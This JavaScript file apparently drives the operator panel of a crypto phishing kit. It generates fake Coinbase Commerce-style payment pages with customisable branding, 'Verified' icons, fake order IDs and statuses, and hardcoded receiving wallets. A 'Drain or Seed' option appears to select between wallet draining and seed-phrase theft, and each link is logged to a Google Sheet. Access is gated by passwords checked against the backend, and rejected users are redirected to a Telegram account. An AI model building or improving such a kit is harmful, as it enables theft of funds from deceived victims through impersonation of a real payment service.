import CONFIG from './config.js';

function generateSecret(length = 10) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function generateOrderId() {
    const randomPart = generateSecret(7);
    return `${randomPart.toUpperCase()}`;
}

const senderNameInput = document.getElementById('senderName');
const walletInput = document.getElementById('wallet');
const walletFieldToggle = document.getElementById('walletFieldToggle');
const walletFieldContainer = document.getElementById('walletFieldContainer');
const subtotalInput = document.getElementById('amount');
const totalWorthInput = document.getElementById('totalWorth');
const titleInput = document.getElementById('title');
const paymentMethodsInput = document.getElementById('paymentMethods');
const paymentMethodsSelected = document.getElementById('paymentMethodsSelected');
const paymentMethodsOptions = document.getElementById('paymentMethodsOptions');
const currencyInput = document.getElementById('currency');
const currencySelected = document.getElementById('currencySelected');
const currencyOptions = document.getElementById('currencyOptions');
const orderIdInput = document.getElementById('orderId');
const dateInput = document.getElementById('date');
const statusSelect = document.getElementById('status');
const statusSelected = document.getElementById('statusSelected');
const drainOrSeedSelect = document.getElementById('drainOrSeed');
const drainOrSeedSelected = document.getElementById('drainOrSeedSelected');
const buttonTextInput = document.getElementById('buttonText');
const buttonClassInput = document.getElementById('buttonClass');
const emailReceiptInput = document.getElementById('emailReceipt');
const generateBtn = document.getElementById('generateBtn');
const generateBtnText = document.getElementById('generateBtnText');
const generateBtnSpinner = document.getElementById('generateBtnSpinner');
const iconInput = document.getElementById('icon');
const iconSelected = document.getElementById('iconSelected');
const iconOptions = document.getElementById('iconOptions');
const logoToggle = document.getElementById('logoToggle');
const hideNetworkToggle = document.getElementById('hideNetworkToggle');
const coinbaseTextInput = document.getElementById('coinbaseText');
const coinbaseColorInput = document.getElementById('coinbaseColor');
const commerceTextInput = document.getElementById('commerceText');
const commerceColorInput = document.getElementById('commerceColor');
const generateOrderIdBtn = document.getElementById('generateOrderIdBtn');

const previewSenderName = document.getElementById('previewSenderName');
const previewSubtotal = document.getElementById('previewAmount');
const previewFee = document.getElementById('previewFee');
const previewAmountTotal = document.getElementById('previewAmountTotal');
const previewWalletShort = document.getElementById('previewWalletShort');
const previewWalletLink = document.getElementById('previewWalletLink');
const previewWalletFieldDisplay = document.getElementById('previewWalletFieldDisplay');
const previewCurrency = document.getElementById('previewCurrency');
const previewCurrencyIcon = document.getElementById('previewCurrencyIcon');
const previewNetwork = document.getElementById('previewNetwork');
const previewNetworkIcon = document.getElementById('previewNetworkIcon');
const previewDate = document.getElementById('previewDate');
const previewOrderCode = document.getElementById('previewOrderCode');
const previewStatus = document.getElementById('previewStatus');
const previewEmailInputContainer = document.getElementById('previewEmailInputContainer');
const previewEmailInput = document.getElementById('previewEmailInput');
const previewExplorerLink = document.getElementById('previewExplorerLink');
const previewTitle = document.getElementById('previewTitle');
const previewVerifiedIcon = document.getElementById('previewVerifiedIcon');
const previewLogoContainer = document.getElementById('previewLogoContainer');
const previewCoinbaseText = document.getElementById('previewCoinbaseText');
const previewCommerceText = document.getElementById('previewCommerceText');

const previewSenderNameMobile = document.getElementById('previewSenderNameMobile');
const previewSubtotalMobile = document.getElementById('previewAmountMobile');
const previewFeeMobile = document.getElementById('previewFeeMobile');
const previewAmountTotalMobile = document.getElementById('previewAmountTotalMobile');
const previewWalletShortMobile = document.getElementById('previewWalletShortMobile');
const previewWalletLinkMobile = document.getElementById('previewWalletLinkMobile');
const previewWalletFieldDisplayMobile = document.getElementById('previewWalletFieldDisplayMobile');
const previewCurrencyMobile = document.getElementById('previewCurrencyMobile');
const previewCurrencyIconMobile = document.getElementById('previewCurrencyIconMobile');
const previewNetworkMobile = document.getElementById('previewNetworkMobile');
const previewNetworkIconMobile = document.getElementById('previewNetworkIconMobile');
const previewDateMobile = document.getElementById('previewDateMobile');
const previewOrderCodeMobile = document.getElementById('previewOrderCodeMobile');
const previewStatusMobile = document.getElementById('previewStatusMobile');
const previewEmailInputContainerMobile = document.getElementById('previewEmailInputContainerMobile');
const previewEmailInputMobile = document.getElementById('previewEmailInputMobile');
const previewExplorerLinkMobile = document.getElementById('previewExplorerLinkMobile');
const previewTitleMobile = document.getElementById('previewTitleMobile');
const previewVerifiedIconMobile = document.getElementById('previewVerifiedIconMobile');
const previewCoinbaseTextMobile = document.getElementById('previewCoinbaseTextMobile');
const previewCommerceTextMobile = document.getElementById('previewCommerceTextMobile');

const passwordModal = document.getElementById('passwordModal');
const passwordInput = document.getElementById('passwordInput');
const passwordError = document.getElementById('passwordError');
const submitPassword = document.getElementById('submitPassword');
const mainContent = document.getElementById('mainContent');

async function checkPassword(password, incrementCounter = false) {
    try {
        const response = await fetch(`${CONFIG.GOOGLE_SHEET_API_URL}?action=checkPassword&password=${encodeURIComponent(password)}&incrementCounter=${incrementCounter}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
        });
        const result = await response.json();
        return result;
    } catch (error) {
        console.error('Error checking password:', error);
        return { valid: false, error: 'Failed to check password' };
    }
}

function showPasswordModal() {
    passwordModal.classList.remove('hidden');
    mainContent.classList.add('hidden');
    passwordInput.value = '';
    passwordError.classList.add('hidden');
}

function hidePasswordModal() {
    passwordModal.classList.add('hidden');
    mainContent.classList.remove('hidden');
    localStorage.setItem('lastAuthTime', Date.now());
    startAuthTimer();
}

async function checkPasswordValidity() {
    const currentPassword = localStorage.getItem('currentPassword');
    if (!currentPassword) {
        showPasswordModal();
        return;
    }

    const result = await checkPassword(currentPassword, false); 
    if (!result.valid) {
        window.location.href = 'https://t.me/cosmopwn';
    } else {
        showPasswordModal();
    }
}

function startAuthTimer() {
    setTimeout(() => {
        checkPasswordValidity();
    }, 1 * 60 * 1000); 
}

function shouldRequestPassword() {
    const lastAuthTime = localStorage.getItem('lastAuthTime');
    if (!lastAuthTime) return true;
    const currentTime = Date.now();
    const timeDiff = (currentTime - lastAuthTime) / 1000; 
    return timeDiff > 60; 
}

submitPassword.addEventListener('click', async () => {
    const password = passwordInput.value.trim();
    if (!password) {
        passwordError.textContent = 'Please enter a password';
        passwordError.classList.remove('hidden');
        return;
    }

    const result = await checkPassword(password, true); 
    if (result.valid) {
        localStorage.setItem('currentPassword', password);
        hidePasswordModal();
    } else {
        passwordError.textContent = result.error || 'Invalid password';
        passwordError.classList.remove('hidden');
    }
});

document.addEventListener('DOMContentLoaded', async () => {
    if (shouldRequestPassword()) {
        showPasswordModal();
    } else {
        const currentPassword = localStorage.getItem('currentPassword');
        if (currentPassword) {
            const result = await checkPassword(currentPassword, false);
            if (!result.valid) {
                window.location.href = 'https://t.me/cosmopwn';
            } else {
                hidePasswordModal();
            }
        } else {
            showPasswordModal();
        }
    }
});

function populateCurrencyDropdown() {
    currencyOptions.innerHTML = Object.entries(CONFIG.CURRENCIES).map(([value, icon]) => `
        <div class="dropdown-option p-2 flex items-center hover:bg-gray-100 cursor-pointer" data-value="${value}">
            <img src="${icon}" alt="${value} Icon" class="dropdown-icon w-4 h-4 mr-2">
            <span class="text-sm">${value}</span>
        </div>
    `).join('');

    document.querySelectorAll('#currencyOptions .dropdown-option').forEach(option => {
        option.addEventListener('click', () => {
            const value = option.getAttribute('data-value');
            const text = option.querySelector('span').textContent;
            const iconSrc = option.querySelector('img').src;

            currencySelected.querySelector('span').textContent = text;
            currencySelected.querySelector('img').src = iconSrc;
            currencyInput.value = value;
            currencyOptions.classList.add('hidden');
            updateWalletDefault(value);
            lockStrategyIfNeeded(value, paymentMethodsInput.value);

            if (value === 'BTC') {
                subtotalInput.value = '0.1';
                totalWorthInput.value = '10000';
            } else if (value === 'SOL') {
                subtotalInput.value = '10';
                totalWorthInput.value = '10000';
            } else {
                subtotalInput.value = CONFIG.DEFAULTS.amount;
                totalWorthInput.value = CONFIG.DEFAULTS.amount;
            }

            if (value === 'BTC' || value === 'SOL') {
                hideNetworkToggle.disabled = true;
                hideNetworkToggle.checked = true;
                hideNetworkToggle.parentElement.classList.add('switch-disabled');
                paymentMethodsSelected.classList.add('disabled');
                paymentMethodsSelected.style.opacity = '0.5';
                paymentMethodsSelected.style.cursor = 'not-allowed';
            } else {
                hideNetworkToggle.disabled = false;
                hideNetworkToggle.checked = false;
                hideNetworkToggle.parentElement.classList.remove('switch-disabled');
                paymentMethodsSelected.classList.remove('disabled');
                paymentMethodsSelected.style.opacity = '1';
                paymentMethodsSelected.style.cursor = 'pointer';
            }

            updatePreview();
        });
    });
}

function populateNetworkDropdown() {
    paymentMethodsOptions.innerHTML = Object.entries(CONFIG.NETWORKS).map(([value, icon]) => `
        <div class="dropdown-option p-2 flex items-center hover:bg-gray-100 cursor-pointer" data-value="${value}">
            <img src="${icon}" alt="${value} Icon" class="dropdown-icon w-4 h-4 mr-2">
            <span class="text-sm">${value}</span>
        </div>
    `).join('');

    document.querySelectorAll('#paymentMethodsOptions .dropdown-option').forEach(option => {
        option.addEventListener('click', () => {
            const value = option.getAttribute('data-value');
            const text = option.querySelector('span').textContent;
            const iconSrc = option.querySelector('img').src;

            paymentMethodsSelected.querySelector('span').textContent = text;
            paymentMethodsSelected.querySelector('img').src = iconSrc;
            paymentMethodsInput.value = value;
            paymentMethodsOptions.classList.add('hidden');
            updateWalletDefault(currencyInput.value, value);
            lockStrategyIfNeeded(currencyInput.value, value);
            updatePreview();
        });
    });
}

function populateStatusDropdown() {
    const statusOptions = document.getElementById('statusOptions');
    statusOptions.querySelectorAll('.dropdown-option').forEach(option => {
        option.addEventListener('click', () => {
            const value = option.getAttribute('data-value');
            statusSelected.querySelector('span').textContent = value;
            statusSelect.value = value;
            statusOptions.classList.add('hidden');
            updatePreview();
        });
    });
}

function populateStrategyDropdown() {
    const drainOrSeedOptions = drainOrSeedSelected.nextElementSibling;
    drainOrSeedOptions.querySelectorAll('.dropdown-option').forEach(option => {
        option.addEventListener('click', () => {
            const value = option.getAttribute('data-value');
            if (!drainOrSeedSelected.classList.contains('disabled')) {
                drainOrSeedSelected.querySelector('span').textContent = value;
                drainOrSeedSelect.value = value;
                drainOrSeedOptions.classList.add('hidden');
                updatePreview();
            }
        });
    });
}

function populateIconDropdown() {
    document.querySelectorAll('#iconOptions .dropdown-option').forEach(option => {
        option.addEventListener('click', () => {
            const value = option.getAttribute('data-value');
            const text = option.querySelector('span').textContent;
            const iconSrc = option.querySelector('img').src;

            iconSelected.querySelector('span').textContent = text;
            iconSelected.querySelector('img').src = iconSrc;
            iconInput.value = value;
            iconOptions.classList.add('hidden');
            updatePreview();
        });
    });
}

[currencySelected, paymentMethodsSelected, statusSelected, drainOrSeedSelected, iconSelected].forEach(selected => {
    selected.addEventListener('click', () => {
        if (!selected.classList.contains('disabled')) {
            const options = selected.nextElementSibling;
            options.classList.toggle('hidden');
        }
    });
});

document.addEventListener('click', (e) => {
    [currencySelected, paymentMethodsSelected, statusSelected, drainOrSeedSelected, iconSelected].forEach(selected => {
        const options = selected.nextElementSibling;
        if (!selected.contains(e.target) && !options.contains(e.target)) {
            options.classList.add('hidden');
        }
    });
});

[senderNameInput, walletInput, subtotalInput, totalWorthInput, titleInput, orderIdInput, dateInput, statusSelect, drainOrSeedSelect, buttonTextInput, buttonClassInput, emailReceiptInput, iconInput, walletFieldToggle, logoToggle, hideNetworkToggle, coinbaseTextInput, coinbaseColorInput, commerceTextInput, commerceColorInput].forEach(element => {
    element.addEventListener('input', updatePreview);
    element.addEventListener('change', updatePreview);
});

[paymentMethodsInput, currencyInput].forEach(input => input.addEventListener('change', updatePreview));

walletFieldToggle.addEventListener('change', () => {
    walletFieldContainer.style.display = walletFieldToggle.checked ? 'block' : 'none';
    updatePreview();
});

generateOrderIdBtn.addEventListener('click', () => {
    const newOrderId = generateOrderId();
    orderIdInput.value = newOrderId;
    updatePreview();
});

function setInitialValues() {
    senderNameInput.value = CONFIG.DEFAULTS.senderName;
    walletInput.value = CONFIG.DEFAULTS.wallet;
    subtotalInput.value = CONFIG.DEFAULTS.amount;
    totalWorthInput.value = CONFIG.DEFAULTS.amount;
    titleInput.value = CONFIG.DEFAULTS.title;
    orderIdInput.value = CONFIG.DEFAULTS.orderId;
    dateInput.value = CONFIG.DEFAULTS.date;
    buttonTextInput.value = CONFIG.DEFAULTS.buttonText;
    buttonClassInput.value = CONFIG.DEFAULTS.buttonClass || 'interact-button';
    drainOrSeedSelect.value = CONFIG.DEFAULTS.strategy;
    drainOrSeedSelected.querySelector('span').textContent = CONFIG.DEFAULTS.strategy;
    currencyInput.value = CONFIG.DEFAULTS.currency;
    currencySelected.querySelector('span').textContent = CONFIG.DEFAULTS.currency;
    currencySelected.querySelector('img').src = CONFIG.CURRENCIES[CONFIG.DEFAULTS.currency];
    paymentMethodsInput.value = CONFIG.DEFAULTS.network;
    paymentMethodsSelected.querySelector('span').textContent = CONFIG.DEFAULTS.network;
    paymentMethodsSelected.querySelector('img').src = CONFIG.NETWORKS[CONFIG.DEFAULTS.network];
    statusSelect.value = CONFIG.DEFAULTS.status;
    statusSelected.querySelector('span').textContent = CONFIG.DEFAULTS.status;
    iconInput.value = CONFIG.DEFAULTS.icon || './media/verified.png';
    iconSelected.querySelector('span').textContent = 'Verified';
    iconSelected.querySelector('img').src = CONFIG.DEFAULTS.icon || './media/verified.png';
    emailReceiptInput.checked = CONFIG.DEFAULTS.emailReceipt;
    walletFieldToggle.checked = CONFIG.DEFAULTS.walletField;
    walletFieldContainer.style.display = walletFieldToggle.checked ? 'block' : 'none';
    logoToggle.checked = CONFIG.DEFAULTS.logoDisplay;
    hideNetworkToggle.checked = false;
    coinbaseTextInput.value = CONFIG.DEFAULTS.coinbaseText;
    coinbaseColorInput.value = CONFIG.DEFAULTS.coinbaseColor;
    commerceTextInput.value = CONFIG.DEFAULTS.commerceText;
    commerceColorInput.value = CONFIG.DEFAULTS.commerceColor;
}

function updateWalletDefault(currency, network = paymentMethodsInput.value) {
    if (currency === 'BTC') {
        walletInput.value = 'bc1qwzz7hn6e8ce2n2825k9wreq6rsvsz6hfewrp52';
    } else if (currency === 'SOL') {
        walletInput.value = 'FZQAqeJaagf6Md2bN1uzWNuwHHWnaCEysWWauQ3gYix7';
    } else if (network === 'TRON') {
        walletInput.value = 'TTo2gZ2AK3EVae6t9hECrmd1cTsu8sb9GD';
    } else {
        walletInput.value = CONFIG.DEFAULTS.wallet;
    }
}

function lockStrategyIfNeeded(currency, network) {
    if (currency === 'BTC' || currency === 'SOL' || network === 'TRON') {
        drainOrSeedSelect.value = 'Seed';
        drainOrSeedSelected.querySelector('span').textContent = 'Seed';
        drainOrSeedSelected.classList.add('disabled');
        drainOrSeedSelected.style.opacity = '0.5';
        drainOrSeedSelected.style.cursor = 'not-allowed';
    } else {
        drainOrSeedSelected.classList.remove('disabled');
        drainOrSeedSelected.style.opacity = '1';
        drainOrSeedSelected.style.cursor = 'pointer';
    }
}

function getWalletLink(currency, network, wallet) {
    if (currency === 'BTC') {
        return `https://blockchair.com/bitcoin/address/${wallet}`;
    } else if (currency === 'SOL') {
        return `https://solscan.io/account/${wallet}`;
    } else if (network === 'TRON') {
        return `https://tronscan.org/#/address/${wallet}`;
    } else {
        return `https://debank.com/profile/${wallet}`;
    }
}

function updatePreview() {
    const walletFieldEnabled = walletFieldToggle.checked;
    let wallet = walletFieldEnabled ? (walletInput.value || updateWalletDefault(currencyInput.value)) : '';
    const shortWallet = wallet.length > 20 ? wallet.substring(0, 20) + '...' : wallet;
    const selectedCurrency = currencyInput.value || CONFIG.DEFAULTS.currency;
    const selectedMethod = paymentMethodsInput.value || CONFIG.DEFAULTS.network;
    const statusValue = statusSelect.value;
    const buttonText = buttonTextInput.value.trim() || CONFIG.DEFAULTS.buttonText;
    const buttonClass = buttonClassInput.value.trim();
    const emailReceiptValue = emailReceiptInput.checked;
    const selectedIcon = iconInput.value || CONFIG.DEFAULTS.icon || './media/verified.png';
    const logoEnabled = logoToggle.checked;
    const hideNetwork = hideNetworkToggle.checked;
    const coinbaseText = coinbaseTextInput.value || CONFIG.DEFAULTS.coinbaseText;
    const coinbaseColor = coinbaseColorInput.value || CONFIG.DEFAULTS.coinbaseColor;
    const commerceText = commerceTextInput.value || CONFIG.DEFAULTS.commerceText;
    const commerceColor = commerceColorInput.value || CONFIG.DEFAULTS.commerceColor;
    const subtotalValue = parseFloat(subtotalInput.value) || parseFloat(CONFIG.DEFAULTS.amount);
    const totalWorthValue = parseFloat(totalWorthInput.value) || parseFloat(CONFIG.DEFAULTS.amount);
    const feeValue = totalWorthValue * 0.01; 
    const currentDate = new Date().toLocaleDateString('en-US', { month: 'short', day: '2-digit', year: 'numeric' });

    previewSenderName.textContent = senderNameInput.value || CONFIG.DEFAULTS.senderName;
    previewVerifiedIcon.src = selectedIcon;
    previewSubtotal.textContent = `${subtotalValue.toFixed(2)} ${selectedCurrency}`;
    previewFee.textContent = feeValue.toFixed(2);
    previewAmountTotal.textContent = totalWorthValue.toFixed(2);
    previewWalletFieldDisplay.style.display = walletFieldEnabled ? 'block' : 'none';
    previewWalletShort.textContent = walletFieldEnabled && wallet ? shortWallet : 'N/A';
    previewWalletLink.href = walletFieldEnabled && wallet ? getWalletLink(selectedCurrency, selectedMethod, wallet) : '#';
    previewWalletLink.style.pointerEvents = walletFieldEnabled && wallet ? 'auto' : 'none';
    previewCurrency.textContent = `${selectedCurrency} `;
    previewCurrencyIcon.src = CONFIG.CURRENCIES[selectedCurrency] || CONFIG.CURRENCIES[CONFIG.DEFAULTS.currency];
    previewNetwork.textContent = hideNetwork ? '' : `${selectedMethod}`;
    previewNetworkIcon.src = CONFIG.NETWORKS[selectedMethod] || CONFIG.NETWORKS[CONFIG.DEFAULTS.network];
    previewNetwork.style.display = hideNetwork ? 'none' : 'inline';
    previewNetworkIcon.style.display = hideNetwork ? 'none' : 'inline';
    previewDate.textContent = currentDate;
    previewOrderCode.textContent = orderIdInput.value || CONFIG.DEFAULTS.orderId;
    previewStatus.textContent = statusValue;
    previewStatus.classList.remove('bg-blue-100', 'text-blue-800', 'bg-yellow-100', 'text-yellow-800', 'bg-red-100', 'text-red-800');
    if (statusValue.toLowerCase() === 'complete') previewStatus.classList.add('bg-blue-100', 'text-blue-800');
    else if (statusValue.toLowerCase() === 'pending') previewStatus.classList.add('bg-yellow-100', 'text-yellow-800');
    else if (statusValue.toLowerCase() === 'failed') previewStatus.classList.add('bg-red-100', 'text-red-800');
    previewTitle.textContent = titleInput.value.trim() || CONFIG.DEFAULTS.title;
    previewExplorerLink.innerHTML = `
        <svg class="w-5 h-5 text-white" version="1.2" baseProfile="tiny" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024">
            <path fill="currentColor" d="M512.1,692c-99.4,0-180-80.5-180-180s80.6-180,180-180c89.1,0,163.1,65,177.3,150h181.3c-15.3-184.8-170-330-358.7-330c-198.8,0-360,161.2-360,360s161.2,360,360,360c188.7,0,343.4-145.2,358.7-330H689.3C675,627,601.2,692,512.1,692z"/>
        </svg>
        <span>${buttonText}</span>
    `;
    previewExplorerLink.className = `action-btn block flex items-center justify-center space-x-2 ${buttonClass}`;
    previewEmailInputContainer.style.display = emailReceiptValue ? 'block' : 'none';
    if (emailReceiptValue) previewEmailInput.value = '';
    previewLogoContainer.style.display = logoEnabled ? 'flex' : 'none';
    previewCoinbaseText.textContent = coinbaseText;
    previewCoinbaseText.style.color = coinbaseColor;
    previewCommerceText.textContent = commerceText;
    previewCommerceText.style.color = commerceColor;

    previewSenderNameMobile.textContent = previewSenderName.textContent;
    previewVerifiedIconMobile.src = selectedIcon;
    previewSubtotalMobile.textContent = `${subtotalValue.toFixed(2)} ${selectedCurrency}`;
    previewFeeMobile.textContent = feeValue.toFixed(2);
    previewAmountTotalMobile.textContent = totalWorthValue.toFixed(2);
    previewWalletFieldDisplayMobile.style.display = walletFieldEnabled ? 'block' : 'none';
    previewWalletShortMobile.textContent = walletFieldEnabled && wallet ? shortWallet : 'N/A';
    previewWalletLinkMobile.href = walletFieldEnabled && wallet ? getWalletLink(selectedCurrency, selectedMethod, wallet) : '#';
    previewWalletLinkMobile.style.pointerEvents = walletFieldEnabled && wallet ? 'auto' : 'none';
    previewCurrencyMobile.textContent = previewCurrency.textContent;
    previewCurrencyIconMobile.src = previewCurrencyIcon.src;
    previewNetworkMobile.textContent = hideNetwork ? '' : `${selectedMethod}`;
    previewNetworkIconMobile.src = previewNetworkIcon.src;
    previewNetworkMobile.style.display = hideNetwork ? 'none' : 'inline';
    previewNetworkIconMobile.style.display = hideNetwork ? 'none' : 'inline';
    previewDateMobile.textContent = currentDate;
    previewOrderCodeMobile.textContent = previewOrderCode.textContent;
    previewStatusMobile.textContent = statusValue;
    previewStatusMobile.classList.remove('bg-blue-100', 'text-blue-800', 'bg-yellow-100', 'text-yellow-800', 'bg-red-100', 'text-red-800');
    if (statusValue.toLowerCase() === 'complete') previewStatusMobile.classList.add('bg-blue-100', 'text-blue-800');
    else if (statusValue.toLowerCase() === 'pending') previewStatusMobile.classList.add('bg-yellow-100', 'text-yellow-800');
    else if (statusValue.toLowerCase() === 'failed') previewStatusMobile.classList.add('bg-red-100', 'text-red-800');
    previewTitleMobile.textContent = previewTitle.textContent;
    previewExplorerLinkMobile.innerHTML = `
        <svg class="w-5 h-5 text-white" version="1.2" baseProfile="tiny" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024">
            <path fill="currentColor" d="M512.1,692c-99.4,0-180-80.5-180-180s80.6-180,180-180c89.1,0,163.1,65,177.3,150h181.3c-15.3-184.8-170-330-358.7-330c-198.8,0-360,161.2-360,360s161.2,360,360,360c188.7,0,343.4-145.2,358.7-330H689.3C675,627,601.2,692,512.1,692z"/>
        </svg>
        <span>${buttonText}</span>
    `;
    previewExplorerLinkMobile.className = `action-btn block flex items-center justify-center space-x-2 ${buttonClass}`;
    previewEmailInputContainerMobile.style.display = emailReceiptValue ? 'block' : 'none';
    if (emailReceiptValue) previewEmailInputMobile.value = '';
    previewCoinbaseTextMobile.textContent = coinbaseText;
    previewCoinbaseTextMobile.style.color = coinbaseColor;
    previewCommerceTextMobile.textContent = commerceText;
    previewCommerceTextMobile.style.color = commerceColor;
}

function validateAndHighlightFields() {
    const requiredFields = walletFieldToggle.checked
        ? [walletInput, subtotalInput, totalWorthInput, orderIdInput, dateInput, statusSelect]
        : [subtotalInput, totalWorthInput, orderIdInput, dateInput, statusSelect];
    let isValid = true;

    requiredFields.forEach(field => {
        if (!field.value.trim()) {
            field.classList.add('border-red-500');
            field.classList.remove('border-gray-200');
            isValid = false;
        } else {
            field.classList.remove('border-red-500');
            field.classList.add('border-gray-200');
        }
    });

    return isValid;
}

[walletInput, subtotalInput, totalWorthInput, orderIdInput, dateInput, statusSelect].forEach(input => {
    input.addEventListener('input', () => {
        if (input.value.trim()) {
            input.classList.remove('border-red-500');
            input.classList.add('border-gray-200');
        }
    });
});

generateBtn.addEventListener('click', async () => {
    if (!validateAndHighlightFields()) return;

    const senderName = senderNameInput.value || CONFIG.DEFAULTS.senderName;
    const wallet = walletFieldToggle.checked ? walletInput.value : '';
    const subtotal = parseFloat(subtotalInput.value).toFixed(2);
    const totalWorth = parseFloat(totalWorthInput.value).toFixed(2);
    const title = titleInput.value.trim();
    const currency = currencyInput.value;
    const orderId = orderIdInput.value;
    const status = statusSelect.value;
    const drainOrSeed = drainOrSeedSelect.value;
    const buttonText = buttonTextInput.value.trim() || CONFIG.DEFAULTS.buttonText;
    const buttonClass = buttonClassInput.value.trim();
    const emailReceipt = emailReceiptInput.checked;
    const email = '';
    const paymentMethod = paymentMethodsInput.value;
    const icon = iconInput.value;
    const walletField = walletFieldToggle.checked;
    const logoDisplay = logoToggle.checked;
    const hideNetwork = hideNetworkToggle.checked;
    const coinbaseText = coinbaseTextInput.value || CONFIG.DEFAULTS.coinbaseText;
    const coinbaseColor = coinbaseColorInput.value || CONFIG.DEFAULTS.coinbaseColor;
    const commerceText = commerceTextInput.value || CONFIG.DEFAULTS.commerceText;
    const commerceColor = commerceColorInput.value || CONFIG.DEFAULTS.commerceColor;
    const secret = generateSecret();
    const paymentUrl = `${window.location.origin}/payments?subtotal=${subtotal}&secret=${secret}`;

    generateBtn.disabled = true;
    generateBtnText.classList.add('hidden');
    generateBtnSpinner.classList.remove('hidden');

    const paymentData = {
        link: paymentUrl,
        date: new Date().toISOString(),
        secret,
        wallet,
        senderName,
        drainOrSeed,
        subtotal,
        totalWorth,
        currency,
        paymentMethod,
        status,
        orderId,
        title,
        buttonText,
        buttonClass,
        emailReceipt,
        email,
        icon,
        walletField,
        logoDisplay,
        hideNetwork,
        coinbaseText,
        coinbaseColor,
        commerceText,
        commerceColor
    };

    try {
        const response = await fetch(CONFIG.GOOGLE_SHEET_API_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({
                wallet: secret,
                data: JSON.stringify(paymentData)
            }).toString()
        });

        const result = await response.json();
        if (result.error) throw new Error(result.error);

        generateBtn.disabled = false;
        generateBtnText.classList.remove('hidden');
        generateBtnSpinner.classList.add('hidden');
        window.open(paymentUrl, '_blank');
    } catch (error) {
        generateBtn.disabled = false;
        generateBtnText.classList.remove('hidden');
        generateBtnSpinner.classList.add('hidden');
        alert('Не удалось сохранить данные в Google Таблицы');
    }
});

const desktopPreviewBtn = document.getElementById('desktopPreviewBtn');
const mobilePreviewBtn = document.getElementById('mobilePreviewBtn');
const tabletDevice = document.querySelector('.tablet-device');
const desktopView = document.querySelector('.desktop-view');
const mobileView = document.querySelector('.mobile-view');

function switchToDesktopView() {
    tabletDevice.classList.remove('mobile');
    desktopPreviewBtn.classList.add('active');
    mobilePreviewBtn.classList.remove('active');
    desktopView.classList.remove('hidden');
    mobileView.classList.add('hidden');
}

function switchToMobileView() {
    tabletDevice.classList.add('mobile');
    mobilePreviewBtn.classList.add('active');
    desktopPreviewBtn.classList.remove('active');
    desktopView.classList.add('hidden');
    mobileView.classList.remove('hidden');
}

desktopPreviewBtn.addEventListener('click', switchToDesktopView);
mobilePreviewBtn.addEventListener('click', switchToMobileView);

function setInitialPreviewMode() {
    const isMobile = window.innerWidth <= 768;
    if (isMobile) {
        switchToMobileView();
    } else {
        switchToDesktopView();
    }
}

setInitialValues();
populateCurrencyDropdown();
populateNetworkDropdown();
populateStatusDropdown();
populateStrategyDropdown();
populateIconDropdown();
updatePreview();
setInitialPreviewMode();